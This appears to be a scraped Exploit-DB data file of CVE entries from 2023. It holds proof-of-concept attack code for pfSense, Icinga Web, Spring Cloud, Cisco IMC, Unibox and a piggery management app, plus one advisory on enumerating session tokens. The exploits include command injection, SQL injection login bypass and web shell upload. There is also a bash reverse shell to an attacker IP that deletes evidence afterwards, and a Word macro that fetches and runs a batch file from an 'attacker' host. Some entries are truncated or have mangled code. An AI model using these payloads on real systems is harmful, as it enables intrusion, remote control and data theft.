CVE-2023-27253,2023-07-20,exploit db,"# Exploit Title: pfSense v2.7.0 - OS Command Injection #Exploit Author: Emir Polat # CVE-ID : CVE-2023-27253 class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::CmdStager include Msf::Exploit::FileDropper prepend Msf::Exploit::Remote::AutoCheck def initialize(info = {}) super( update_info( info, 'Name' => 'pfSense Restore RRD Data Command Injection', 'Description' => %q{ This module exploits an authenticated command injection vulnerabilty in the ""restore_rrddata()"" function of pfSense prior to version 2.7.0 which allows an authenticated attacker with the ""WebCfg - Diagnostics: Backup & Restore"" privilege to execute arbitrary operating system commands as the ""root"" user. This module has been tested successfully on version 2.6.0-RELEASE. 'License' => MSF_LICENSE, 'Author' => [ 'Emir Polat', # vulnerability discovery & metasploit module 'References' => [ ['CVE', '2023-27253'], ['URL', 'https://redmine.pfsense.org/issues/13935'], ['URL', 'https://github.com/pfsense/pfsense/commit/ca80d18493f8f91b21933ebd6b714215ae1e5e94'] 'DisclosureDate' => '2023-03-18', 'Platform' => ['unix'], 'Arch' => [ ARCH_CMD ], 'Privileged' => true, 'Targets' => [ [ 'Automatic Target', {}] 'Payload' => { 'BadChars' => ""\x2F\x27"", 'Compat' => 'PayloadType' => 'cmd', 'RequiredCmd' => 'generic netcat' 'DefaultOptions' => { 'RPORT' => 443, 'SSL' => true 'DefaultTarget' => 0, 'Notes' => { 'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS] register_options [ OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']), OptString.new('PASSWORD', [true, 'Password to authenticate with', 'pfsense']) end def check unless login return Exploit::CheckCode::Unknown(""#{peer} - Could not obtain the login cookies needed to validate the vulnerability!"") end res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'diag_backup.php'), 'method' => 'GET', 'keep_cookies' => true return Exploit::CheckCode::Unknown(""#{peer} - Could not connect to web service - no response"") if res.nil? return Exploit::CheckCode::Unknown(""#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}"") unless res.code == 200 unless res&.body&.include?('Diagnostics: ') return Exploit::CheckCode::Safe('Vulnerable module not reachable') end version = detect_version unless version return Exploit::CheckCode::Detected('Unable to get the pfSense version') end unless Rex::Version.new(version) < Rex::Version.new('2.7.0-RELEASE') return Exploit::CheckCode::Safe(""Patched pfSense version #{version} detected"") end Exploit::CheckCode::Appears(""The target appears to be running pfSense version #{version}, which is unpatched!"") end def login # Skip the login process if we are already logged in. return true if @logged_in csrf = get_csrf('index.php', 'GET') unless csrf print_error('Could not get the expected CSRF token for index.php when attempting login!') return false end res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'index.php'), 'method' => 'POST', 'vars_post' => { '__csrf_magic' => csrf, 'usernamefld' => datastore['USERNAME'], 'passwordfld' => datastore['PASSWORD'], 'login' => '' 'keep_cookies' => true if res && res.code == 302 @logged_in = true true else false end end def detect_version res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'index.php'), 'method' => 'GET', 'keep_cookies' => true # If the response isn't a 200 ok response or is an empty response, just return nil. unless res && res.code == 200 && res.body return nil end if (%r{Version.+ (? [0-9.]+-RELEASE)\n? }m =~ res.body).nil? nil else version end end def get_csrf(uri, methods) res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, uri), 'method' => methods, 'keep_cookies' => true unless res && res.body return nil # If no response was returned or an empty response was returned, then return nil. end # Try regex match the response body and save the match into a variable named csrf. if (/var csrfMagicToken = ""(? sid:[a-z0-9,;:]+)"";/ =~ res.body).nil? return nil # No match could be found, so the variable csrf won't be defined. else return csrf end end def drop_config csrf = get_csrf('diag_backup.php', 'GET') unless csrf fail_with(Failure::UnexpectedReply, 'Could not get the expected CSRF token for diag_backup.php when dropping the config!') end post_data = Rex::MIME::Message.new post_data.add_part(csrf, nil, nil, 'form-data; name=""__csrf_magic""') post_data.add_part('rrddata', nil, nil, 'form-data; name=""backuparea""') post_data.add_part('', nil, nil, 'form-data; name=""encrypt_password""') post_data.add_part('', nil, nil, 'form-data; name=""encrypt_password_confirm""') post_data.add_part('Download configuration as XML', nil, nil, 'form-data; name=""download""') post_data.add_part('', nil, nil, 'form-data; name=""restorearea""') post_data.add_part('', 'application/octet-stream', nil, 'form-data; name=""conffile""') post_data.add_part('', nil, nil, 'form-data; name=""decrypt_password""') res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'diag_backup.php'), 'method' => 'POST', 'ctype' => ""multipart/form-data; boundary=#{post_data.bound}"", 'data' => post_data.to_s, 'keep_cookies' => true if res && res.code == 200 && res.body =~ / / return res.body else return nil end end def exploit unless login fail_with(Failure::NoAccess, 'Could not obtain the login cookies!') end csrf = get_csrf('diag_backup.php', 'GET') unless csrf fail_with(Failure::UnexpectedReply, 'Could not get the expected CSRF token for diag_backup.php when starting exploitation!') end config_data = drop_config if config_data.nil? fail_with(Failure::UnexpectedReply, 'The drop config response was empty!') end if (%r{ (? .*?) } =~ config_data).nil? fail_with(Failure::UnexpectedReply, 'Could not get the filename from the drop config response!') end config_data.gsub!(' ', '${IFS}') send_p = config_data.gsub(file, ""WAN_DHCP-quality.rrd';#{payload.encoded};"") post_data = Rex::MIME::Message.new post_data.add_part(csrf, nil, nil, 'form-data; name=""__csrf_magic""') post_data.add_part('rrddata', nil, nil, 'form-data; name=""backuparea""') post_data.add_part('yes', nil, nil, 'form-data; name=""donotbackuprrd""') post_data.add_part('yes', nil, nil, 'form-data; name=""backupssh""') post_data.add_part('', nil, nil, 'form-data; name=""encrypt_password""') post_data.add_part('', nil, nil, 'form-data; name=""encrypt_password_confirm""') post_data.add_part('rrddata', nil, nil, 'form-data; name=""restorearea""') post_data.add_part(send_p.to_s, 'text/xml', nil, ""form-data; name=\""conffile\""; filename=\""rrddata-config-pfSense.home.arpa-#{rand_text_alphanumeric(14)}.xml\"""") post_data.add_part('', nil, nil, 'form-data; name=""decrypt_password""') post_data.add_part('Restore Configuration', nil, nil, 'form-data; name=""restore""') res = send_request_cgi( 'uri' => normalize_uri(target_uri.path, 'diag_backup.php'), 'method' => 'POST', 'ctype' => ""multipart/form-data; boundary=#{post_data.bound}"", 'data' => post_data.to_s, 'keep_cookies' => true if res print_error(""The response to a successful exploit attempt should be 'nil'. The target responded with an HTTP response code of #{res.code}. Try rerunning the module."") end end end"
CVE-2023-34635,2023-07-20,exploit db,"# Exploit Title: Wifi Soft Unibox Administration 3.0 & 3.1 Login Page - Sql Injection # Google Dork: intext:""Unibox Administration 3.1"", intext:""Unibox 3.0"" # Date: 07/2023 # Exploit Author: Ansh Jain @sudoark # Author Contact : arkinux01@gmail.com # Vendor Homepage: https://www.wifi-soft.com/ # Software Link: https://www.wifi-soft.com/products/unibox-hotspot-controller.php # Version: Unibox Administration 3.0 & 3.1 # Tested on: Microsoft Windows 11 # CVE : CVE-2023-34635 # CVE URL : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34635 The Wifi Soft Unibox Administration 3.0 and 3.1 Login Page is vulnerable to SQL Injection, which can lead to unauthorised admin access for attackers. The vulnerability occurs because of not validating or sanitising the user input in the username field of the login page and directly sending the input to the backend server and database. ## How to Reproduce Step 1 : Visit the login page and check the version, whether it is 3.0, 3.1, or not. Step 2 : Add this payload "" 'or 1=1 limit 1-- - "" to the username field and enter any random password. Step 3 : Fill in the captcha and hit login. After hitting login, you have been successfully logged in as an administrator and can see anyone's user data, modify data, revoke access, etc. ### Login Request Parameters: username, password, captcha, action POST /index.php HTTP/2 Host: 255.255.255.255.host.com Cookie: PHPSESSID=rfds9jjjbu7jorb9kgjsko858d User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 83 Origin: https://255.255.255.255.host.com Referer: https://255.255.255.255.host.com/index.php Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers username='or+1=1+limit+1--+-&password=randompassword&captcha=69199&action=Login ### Login Response HTTP/2 302 Found Server: nginx Date: Tue, 18 Jul 2023 13:32:14 GMT Content-Type: text/html; charset=UTF-8 Location: ./dashboard/dashboard Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache ### Successful Loggedin Request GET /dashboard/dashboard HTTP/2 Host: 255.255.255.255.host.com Cookie: PHPSESSID=rfds9jjjbu7jorb9kgjsko858d User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://255.255.255.255.host.com/index.php Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers ### Successful Loggedin Response HTTP/2 200 OK Server: nginx Date: Tue, 18 Jul 2023 13:32:43 GMT Content-Type: text/html; charset=UTF-8 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Cache_control: private html content"
CVE-2023-38357,2023-07-20,exploit db,"Exploit Title: RWS WorldServer 11.7.3 - Session Token Enumeration Session tokens in RWS WorldServer have a low entropy and can be enumerated, leading to unauthorised access to user sessions. Details Product: WorldServer Affected Versions: 11.7.3 and earlier versions Fixed Version: 11.8.0 Vulnerability Type: Session Token Enumeration Security Risk: high Vendor URL: https://www.rws.com/localization/products/additional-solutions/ Vendor Status: fixed version released Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-001 Advisory Status: published CVE: CVE-2023-38357 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38357 Introduction ""WorldServer offers a flexible, enterprise-class translation management system that automates translation tasks and greatly reduces the cost of supporting large volumes of local language content."" (from the vendor's homepage) More Details WorldServer associates user sessions with numerical tokens, which always are positive values below 2^31. The SOAP action ""loginWithToken"" allows for a high amount of parallel attempts to check if a token is valid. During analysis, many assigned tokens were found to be in the 7-digit range of values. An attacker is therefore able to enumerate user accounts in only a few hours. Proof of Concept In the following an example ""loginWithToken"" request is shown: POST /ws/services/WSContext HTTP/1.1 Content-Type: text/xml;charset=UTF-8 SOAPAction: """" Content-Length: 501 Host: www.example.com Connection: close User-Agent: agent FUZZ ----------------------------------------------------------------------- It can be saved as file ""login-soap.req"" and be used as a request template for the command-line HTTP enumerator monsoon [1] to achieve many parallel requests: $ monsoon fuzz --threads 100 \ --template-file login-soap.req \ --range 1-2147483647 \ --hide-pattern ""InvalidSessionException"" \ 'https://www.example.com' Target URL: https://www.example.com/ status header body value extract 500 191 560 5829099 500 191 556 6229259 200 191 3702 7545136 500 191 556 9054984 processed 12000000 HTTP requests in 2h38m38s 4 of 12000000 requests shown, 1225 req/s The --range parameter reflects the possible value range of 2^31 and for each value an HTTP request is sent to the WorldServer SOAP API where the FUZZ marker in the request template is replaced with the respective value. Also responses are hidden which contain ""InvalidSessionException"" as these sessions are invalid. Responses will yield a status code of 200 if an administrative session token is found. For an unprivileged user session, status code 500 is returned. Workaround Lower the rate at which requests can be issued, for example with a frontend proxy. Fix According to the vendor, upgrading to versions above 11.8.0 resolves the vulnerability. Security Risk Attackers can efficiently enumerate session tokens. In a penetration test, it was possible to get access to multiple user accounts, including administrative accounts using this method in under three hours. Additionally, by using such an administrative account it seems likely to be possible to execute arbitrary code on the underlying server by customising the REST API [2]. Thus, the vulnerability poses a high risk. Timeline 2023-03-27 Vulnerability identified 2023-03-30 Customer approved disclosure to vendor 2023-04-03 Requested security contact from vendor 2023-04-06 Vendor responded with security contact 2023-04-14 Advisory sent to vendor 2023-04-18 Vendor confirms vulnerability and states that it was already known and fixed in version 11.8.0. 2023-07-03 Customer confirms update to fixed version 2023-07-05 CVE ID requested 2023-07-15 CVE ID assigned 2023-07-19 Advisory released References [1] https://github.com/RedTeamPentesting/monsoon [2] https://docs.rws.com/860026/585715/worldserver-11-7-developer-documentation/customizing-the-rest-api RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: https://www.redteam-pentesting.de/ Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: https://jobs.redteam-pentesting.de/ RedTeam Pentesting GmbH Tel.: +49 241 510081-0 Alter Posthof 1 Fax : +49 241 510081-99 52062 Aachen https://www.redteam-pentesting.de Germany Registergericht: Aachen HRB 14004 Geschäftsführer: Patrick Hof, Jens Liebchen"
CVE-2022-28171,2023-07-19,exploit db,"# Exploit Title: Hikvision Hybrid SAN Ds-a71024 Firmware - Multiple Remote Code Execution # Date: 16 July 2023 # Exploit Author: Thurein Soe # CVE : CVE-2022-28171 # Vendor Homepage: https://www.hikvision.com # Software Link: N/A # Refence Link: https://cve.report/CVE-2022-28171 # Version: Filmora 12: Ds-a71024 Firmware, Ds-a71024 Firmware Ds-a71048r-cvs Firmware Ds-a71048 Firmware Ds-a71072r Firmware Ds-a71072r Firmware Ds-a72024 Firmware Ds-a72024 Firmware Ds-a72048r-cvs Firmware Ds-a72072r Firmware Ds-a80316s Firmware Ds-a80624s Firmware Ds-a81016s Firmware Ds-a82024d Firmware Ds-a71048r-cvs Ds-a71024 Ds-a71048 Ds-a71072r Ds-a80624s Ds-a82024d Ds-a80316s Ds-a81016s Vendor Description: Hikvision is a world-leading surveillance manufacturer and supplier of video surveillance and Internet of Things (IoT) equipment for civilian and military purposes. Some Hikvision Hybrid SAN products were vulnerable to multiple remote code execution vulnerabilities such as command injection, Blind SQL injection, HTTP request smuggling, and reflected cross-site scripting. This resulted in remote code execution that allows an adversary to execute arbitrary operating system commands and more. However, an adversary must be on the same network to leverage this vulnerability to execute arbitrary commands. Vulnerability description: A manual test confirmed that The download type parameter was vulnerable to Blind SQL injection.I created a Python script to automate and enumerate SQL versions as the Application was behind the firewall and block all the requests from SQLmap. Request Body: GET /web/log/dynamic_log.php?target=makeMaintainLog&downloadtype='(select*from(select(sleep(10)))a)' HTTP/1.1 Host: X.X.X.X.12:2004 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 Connection: close"
CVE-2023-37629,2023-07-19,exploit db,"#!/bin/bash # Exploit Title: Online Piggery Management System v1.0 - unauthenticated file upload vulnerability # Date: July 12 2023 # Exploit Author: 1337kid # Software Link: https://www.sourcecodester.com/php/11814/online-pig-management-system-basic-free-version.html # Version: 1.0 # Tested on: Ubuntu # CVE : CVE-2023-37629 # chmod +x exploit.sh # ./exploit.sh web_url # ./exploit.sh http://127.0.0.1:8080/ echo "" _____ _____ ___ __ ___ ____ ________ __ ___ ___ "" echo "" / __\\ \\ / / __|_|_ ) \\_ )__ /__|__ /__ / /|_ ) _ \\"" echo "" | (__ \\ V /| _|___/ / () / / |_ \\___|_ \\ / / _ \\/ /\\_, /"" echo "" \\___| \\_/ |___| /___\\__/___|___/ |___//_/\\___/___|/_/ "" echo "" @1337kid"" echo if [[ $1 == '' ]]; then echo ""No URL specified!"" exit fi base_url=$1 unauth_file_upload() { # CVE-2023-37629 - File upload vuln echo ""Generating shell.php"" cat > shell.php << EOF EOF echo ""done"" curl -s -F pigphoto=@shell.php -F submit=pwned $base_url/add-pig.php > /dev/null req=$(curl -s -I $base_url""uploadfolder/shell.php?cmd=id"" | head -1 | awk '{print $2}') if [[ $req == ""200"" ]]; then echo ""Shell uploaded to $(echo $base_url)uploadfolder/shell.php"" else echo ""Failed to upload a shell"" fi req=$(curl -I -s $base_url | head -1 | awk '{print $2}') if [[ $req -eq ""200"" ]]; then unauth_file_upload else echo ""Error"" echo ""Status Code: $req"" fi"
CVE-2023-1258,2023-07-19,exploit db,"# Exploit Title: ABB FlowX v4.00 - Exposure of Sensitive Information # Date: 2023-03-31 # Exploit Author: Paul Smith # Vendor Homepage: https://new.abb.com/products/measurement-products/flow-computers/spirit-it-flow-x-series # Version: ABB Flow-X all versions before V4.00 # Tested on: Kali Linux # CVE: CVE-2023-1258 #!/usr/bin/python import sys import re from bs4 import BeautifulSoup as BS import lxml import requests # Set the request parameter url = sys.argv[1] def dump_users(): response = requests.get(url) # Check for HTTP codes other than 200 if response.status_code != 200: print('Status:', response.status_code, 'Headers:', response.headers, 'Error Response:',response.text) exit() # Decode the xml response into dictionary and use the data data = response.text soup = BS(data, features=""xml"") logs = soup.find_all(""log"") for log in logs: test = re.search('User (.*?) logged in',str(log)) if test: print(test.group(0)) def main(): dump_users() if __name__ == '__main__': main()"
CVE-2022-24715,2023-07-15,exploit db,"#!/usr/bin/env python3 # Exploit Title: Icinga Web 2.10 - Authenticated Remote Code Execution # Date: 8/07/2023 # Exploit Author: Dante Corona(Aka. cxdxnt) # Software Link: https://github.com/Icinga/icingaweb2 # Vendor Homepage: https://icinga.com/ # Software Link: https://github.com/Icinga/icingaweb2 # Version: <2.8.6, <2.9.6, <2.10 # Tested on: Icinga Web 2 Version 2.9.2 on Linux # CVE: CVE-2022-24715 # Based on: https://nvd.nist.gov/vuln/detail/CVE-2022-24715 import requests,argparse,re,random,string from colorama import Fore,Style def letter_random(): letras = string.ascii_lowercase character_random = random.choices(letras, k=6) return ''.join(character_random) def users_url_password(): parser = argparse.ArgumentParser(description='Descripción de tu programa.') parser.add_argument('-u', '--url',type=str,required=True, help='Insertar la URL http://ip_victima') parser.add_argument('-U', '--user',type=str, required=True ,help='Insertar usuario -U user') parser.add_argument('-P', '--password',type=str, required=True ,help='Insertar contraseña -P password') parser.add_argument('-i', '--ip',type=str,required=True,help='Insertar IP de atacante -i IP') parser.add_argument('-p','--port',type=str, required=True,help='Insertar puerto de atacante -p PORT') args = parser.parse_args() url = args.url user = args.user password=args.password ip_attack = args.ip port_attack = args.port return url,user,password,ip_attack,port_attack def login(url,user,password): try: login_url = url + ""/icingaweb2/authentication/login"" session = requests.Session() r = session.get(login_url) csrf_regex = re.findall(r'name=""CSRFToken"" value=""([^""]*)""',r.text)[0] data_post = {""username"":user, ""password"":password, ""CSRFToken"":csrf_regex, ""formUID"":""form_login"", ""btn_submit"":""Login"" response = session.post(login_url,data=data_post) if ""Welcome to Icinga Web!"" in response.text: print(f""{Fore.GREEN}[*]{Style.RESET_ALL}Session successfully."") r = session.get(login_url) else: print(""[!]Failed to login."") exit(1) #return session,csrf_regex except requests.exceptions.InvalidURL: print(f""{Fore.YELLOW}[!]{Style.RESET_ALL} Error URL :("") exit(1) return session,csrf_regex def upload_file(session,url,character_random,csrf_regex): webshell = f""""""-----BEGIN RSA PRIVATE KEY----- MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu KUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQJAIJLixBy2qpFoS4DSmoEm o3qGy0t6z09AIJtH+5OeRV1be+N4cDYJKffGzDa88vQENZiRm0GRq6a+HPGQMd2k TQIhAKMSvzIBnni7ot/OSie2TmJLY4SwTQAevXysE2RbFDYdAiEBCUEaRQnMnbp7 9mxDXDf6AU0cN/RPBjb9qSHDcWZHGzUCIG2Es59z8ugGrDY+pxLQnwfotadxd+Uy v/Ow5T0q5gIJAiEAyS4RaI9YG8EWx/2w0T67ZUVAw8eOMB6BIUg0Xcu+3okCIBOs /5OiPgoTdSy7bcF9IGpSE8ZgGKzgYQVZeN97YE00 -----END RSA PRIVATE KEY----- """"""%character_random upload_url = url + ""/icingaweb2/config/createresource"" r = session.get(upload_url) csrf = re.findall(r'name=""CSRFToken"" value=""([^""]*)""',r.text)[0] data_post ={""type"":""ssh"", ""name"":""shm/""+character_random, ""user"":f""../../../../../../../../../../../dev/shm/{character_random}/run.php"", ""private_key"":webshell, ""formUID"":""form_config_resource"", ""CSRFToken"":csrf, ""btn_submit"":""Save Changes"" upload_response = session.post(upload_url,data=data_post) check = requests.get(url + f""/icingaweb2/lib/icinga/icinga-php-thirdparty/dev/shm/{character_random}/run.php"") if check.status_code != 200 : print(f""{Fore.YELLOW}[!]{Style.RESET_ALL}Error uploading file. :("") exit(1) else: print(f""{Fore.GREEN}[*]{Style.RESET_ALL}File uploaded successfully."") def enable_module(session,url,character_random): url_module = url+""/icingaweb2/config/general"" r_module = session.get(url_module) csrf_module = re.findall(r'name=""CSRFToken"" value=""([^""]*)""',r_module.text)[0] data_post = {""global_show_stacktraces"":""0"", ""global_show_stacktraces"":""1"", ""global_show_application_state_messages"":""0"", ""global_show_application_state_messages"":""1"", ""global_module_path"":""/dev/shm/"", ""global_config_resource"":""icingaweb2"", ""logging_log"":""none"", ""themes_default"":""Icinga"", ""themes_disabled"":""0"", ""authentication_default_domain"":"""", ""formUID"":""form_config_general"", ""CSRFToken"":f""{csrf_module}"", ""btn_submit"":""Save Changes"" resul = session.post(url_module,data_post) url_enable = url +""/icingaweb2/config/moduleenable"" r_enable = session.get(url_enable) csrf_enable = re.findall(r'name=""CSRFToken"" value=""([^""]*)""',r_enable.text)[0] data_enable = {""identifier"":f""{character_random}"",""CSRFToken"":f""{csrf_enable}"",""btn_submit"":""btn_submit""} resul_enable = session.post(url_enable,data_enable) def reverse_shell(session,url,ip_attack,port_attack,character_random): reverse_url = url + ""/icingaweb2/dashboard"" reverse_exe_one = reverse_url + f'?{character_random}=echo+""bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip_attack}%2F{port_attack}%200%3E%261""+>+/tmp/{character_random}' reverse_exe_two = reverse_url + f""?{character_random}=bash+/tmp/{character_random} &"" reverse_response_one = session.get(reverse_exe_one) try: reverse_response_two = session.get(reverse_exe_two, timeout=5) except: print(f""{Fore.RED}[*]{Style.RESET_ALL}Eliminating evidence"") remove = session.get(reverse_url + f""?{character_random}=rm+/tmp/{character_random}"") disable_url = url + ""/icingaweb2/config/moduledisable"" r_disable = session.get(disable_url) csrf_disable = re.findall(r'name=""CSRFToken"" value=""([^""]*)""',r_disable.text)[0] data_disable = {""identifier"":f""{character_random}"",""CSRFToken"":csrf_disable,""btn_submit"":""btn_submit""} response_disable = session.post(disable_url,data=data_disable) def disable_module(session,url,character_random): url_disable = url + ""/icingaweb2/config/moduledisable"" if __name__ == '__main__': character_random = letter_random() url,user,password,ip_attack,port_attack = users_url_password() session,csrf_regex = login(url,user,password) upload_file(session,url,character_random,csrf_regex) enable_module(session,url,character_random) reverse_shell(session,url,ip_attack,port_attack,character_random)"
CVE-2019-1937,2023-07-15,exploit db,"[+] Exploit Title: Cisco UCS-IMC Supervisor 2.2.0.0 - Authentication Bypass [+] Cisco IMC Supervisor - < 2.2.1.0 [+] Date: 08/21/2019 [+] Affected Component: /app/ui/ClientServlet?apiName=GetUserInfo [+] Vendor: https://www.cisco.com/c/en/us/products/servers-unified-computing/integrated-management-controller-imc-supervisor/index.html [+] Vulnerability Discovery : Pedro Ribeiro [+] Exploit Author: Fatih Sencer [+] CVE: CVE-2019-1937 Usage: ./python3 CiscoIMC-Bypass.py -u host [+] Target https://xxxxxx.com [+] Target OK [+] Exploit Succes [+] Login name : admin [+] Cookie : REACTED import argparse,requests,warnings,base64,json,random,string from requests.packages.urllib3.exceptions import InsecureRequestWarning warnings.simplefilter('ignore',InsecureRequestWarning) def init(): parser = argparse.ArgumentParser(description='Cisco IMC Supervisor / Authentication Bypass') parser.add_argument('-u','--host',help='Host', type=str, required=True) args = parser.parse_args() exploit(args) def exploit(args): session = requests.Session() headers = { ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)"", ""X-Requested-With"": ""XMLHttpRequest"", ""Referer"": ""https://{}/"".format(args.host), ""X-Starship-UserSession-Key"": ''.join(random.choices(string.ascii_uppercase + string.digits, k=10)), ""X-Starship-Request-Key"": ''.join(random.choices(string.ascii_uppercase + string.digits, k=10)) target = ""https://{}/app/ui/ClientServlet?apiName=GetUserInfo"".format(args.host) print(""[+] Target {}"".format(args.host)) exp_send = session.get(target, headers=headers, verify=False, timeout=10) if exp_send.status_code == 200: print(""[+] Target OK"") body_data = json.loads(exp_send.text) if not (body_data.get('loginName') is None): print(""[+] Exploit Succes"") print(""[+] Login name : {}"".format(body_data.get('loginName'))) print(""[+] Cookie : {}"".format(session.cookies.get_dict())) else: print(""[-] Exploit Failed"") else: print(""[-] N/A"") exit() if __name__ == ""__main__"": init()"
CVE-2023-37269,2023-07-15,exploit db,# Exploit Title: WinterCMS < 1.2.3 - Persistent Cross-Site Scripting # Exploit Author: abhishek morla # Google Dork: N/A # Date: 2023-07-10 # Vendor Homepage: https://wintercms.com/ # Software Link: https://github.com/wintercms/winter # Version: 1.2.2 # Tested on: windows64bit / mozila firefox # CVE : CVE-2023-37269 # Report Link : https://github.com/wintercms/winter/security/advisories/GHSA-wjw2-4j7j-6gc3 # Video
CVE-2023-36164,2023-07-11,exploit db,# Exploit Title: MiniTool Partition Wizard ShadowMaker v.12.7 - Unquoted Service Path # Date: 06/07/2023 # Exploit Author: Idan Malihi # Vendor Homepage: https://www.minitool.com/ # Software Link: https://www.minitool.com/download-center/ # Version: 12.7 # Tested on: Microsoft Windows 10 Pro # CVE : CVE-2023-36164
CVE-2023-36165,2023-07-11,exploit db,# Exploit Title: MiniTool Partition Wizard ShadowMaker v.12.7 - Unquoted Service Path # Date: 06/07/2023 # Exploit Author: Idan Malihi # Vendor Homepage: https://www.minitool.com/ # Software Link: https://www.minitool.com/download-center/ # Version: 12.7 # Tested on: Microsoft Windows 10 Pro # CVE : CVE-2023-36165
CVE-2023-36167,2023-07-11,exploit db,# Exploit Title: AVG Anti Spyware 7.5 - Unquoted Service Path # Date: 06/07/2023 # Exploit Author: Idan Malihi # Vendor Homepage: https://www.avg.com # Software Link: https://www.avg.com/en-ww/homepage#pc # Version: 7.5 # Tested on: Microsoft Windows 10 Pro # CVE : CVE-2023-36167
CVE-2023-36166,2023-07-11,exploit db,# Exploit Title: Game Jackal Server v5 - Unquoted Service Path # Date: 06/07/2023 # Exploit Author: Idan Malihi # Vendor Homepage: https://www.allradiosoft.ru # Software Link: https://www.allradiosoft.ru/en/ss/index.htm # Version: 5 # Tested on: Microsoft Windows 10 Pro # CVE : CVE-2023-36166
CVE-2022-22963,2023-07-11,exploit db,"# Exploit Title: Spring Cloud 3.2.2 - Remote Command Execution (RCE) # Date: 07/07/2023 # Exploit Author: GatoGamer1155, 0bfxgh0st # Vendor Homepage: https://spring.io/projects/spring-cloud-function/ # Description: Exploit to execute commands exploiting CVE-2022-22963 # Software Link: https://spring.io/projects/spring-cloud-function # CVE: CVE-2022-22963 import requests, argparse, json parser = argparse.ArgumentParser() parser.add_argument(""--url"", type=str, help=""http://172.17.0.2:8080/functionRouter"", required=True) parser.add_argument(""--command"", type=str, help=""ping -c1 172.17.0.1"", required=True) args = parser.parse_args() print(""\n\033[0;37m[\033[0;33m!\033[0;37m] It is possible that the output of the injected command is not reflected in the response, to validate if the server is vulnerable run a ping or curl to the attacking host\n"") headers = {""spring.cloud.function.routing-expression"": 'T(java.lang.Runtime).getRuntime().exec(""%s"")' % args.command } data = {""data"": """"} request = requests.post(args.url, data=data, headers=headers) response = json.dumps(json.loads(request.text), indent=2) print(response)"
CVE-2023-36163,2023-07-11,exploit db,# Exploit Title: BuildaGate5library v5 - Reflected Cross-Site Scripting (XSS) # Date: 06/07/2023 # Exploit Author: Idan Malihi # Vendor Homepage: None # Version: 5 # Tested on: Microsoft Windows 10 Pro # CVE : CVE-2023-36163
CVE-2023-33131,2023-07-07,exploit db,"## Title: Microsoft Outlook Microsoft 365 MSO (Version 2306 Build 16.0.16529.20100) 32-bit - Remote Code Execution ## Author: nu11secur1ty ## Date: 07.07.2023 ## Vendor: https://www.microsoft.com/ ## Software: https://outlook.live.com/owa/ ## Reference: https://www.crowdstrike.com/cybersecurity-101/remote-code-execution-rce/ ## CVE-2023-33131 ## Description: In this vulnerability, the Microsoft Outlook app allows an attacker to send an infected Word file with malicious content to everyone who using the Outlook app, no matter web or local. Microsoft still doesn't have a patch against this 0-day vulnerability today. ## Staus: HIGH Vulnerability [+]Exploit: - The malicious Word file: ```js Sub AutoOpen() Call Shell(""cmd.exe /S /c"" & ""curl -s https://attacker/namaikativputkata/sichko/nikoganqqsaopraite.bat > nikoganqqsaopraite.bat && .\nikoganqqsaopraite.bat"", vbNormalFocus) End Sub ## Reproduce: [href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33131) ## Proof and Exploit [href](https://www.nu11secur1ty.com/2023/07/cve-2023-33131-microsoft-outlook.html) ## Time spend: 00:30:00"
